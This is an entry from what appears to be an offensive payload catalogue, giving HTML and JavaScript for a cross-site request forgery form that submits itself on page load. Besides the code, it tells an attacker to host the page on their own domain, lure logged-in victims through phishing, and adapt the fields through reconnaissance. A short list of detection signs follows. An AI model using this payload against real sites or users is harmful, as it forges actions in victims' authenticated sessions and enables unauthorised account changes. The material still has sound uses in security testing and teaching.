---
id: a29b59dd-ac70-45d2-98be-f32ca0f57f30
name: CSRF-Auto-Submit-HTML-POST-Payload
type: code
language: HTML
verified: true
created_at: '2023-04-06T03:55:55.442485+00:00'
updated_at: '2023-10-01T12:00:00.000000+00:00'
tags:
  - csrf
  - payload
  - html
  - auto-submit
platforms:
  - Web
validated: true
---

# CSRF-Auto-Submit-HTML-POST-Payload

## Code

```html
<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
 
<script>
 document.getElementById("autosubmit").submit();
</script>
```

## Description

This HTML code creates a malicious form that automatically submits a POST request to a target endpoint upon page load. It includes a hidden input carrying the payload (e.g., a username change) and uses JavaScript to trigger submission without user interaction. Designed for CSRF attacks, it exploits authenticated sessions to perform unauthorized actions like account modifications.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| action URL | Target endpoint for the POST request | `http://target.com/api/change-settings` |
| input name | Name of the form field for the payload | `username` |
| input value | Malicious payload value to submit | `hacked_user` |
| enctype | Encoding type for the form data | `text/plain` or `application/x-www-form-urlencoded` |

## Usage

Embed this code in an HTML page hosted on an attacker-controlled domain. Lure the victim to visit the page via phishing or social engineering while they are logged into the target site. The form will submit immediately, forging a request as if from the legitimate site. Customize the action URL and input values based on the target's form structure, identified through reconnaissance.

## Detection

- Browser developer tools or network logs showing unexpected POST requests from external domains.
- Server-side logs with missing or invalid CSRF tokens/referer headers.
- Anomalous form submissions without corresponding GET requests or user navigation.
- Content Security Policy (CSP) violations if inline scripts are blocked.
- User reports of unauthorized account changes.

## Related

- [[procedures/CSRF-Attack-via-Auto-Submitting-HTML-Form]]
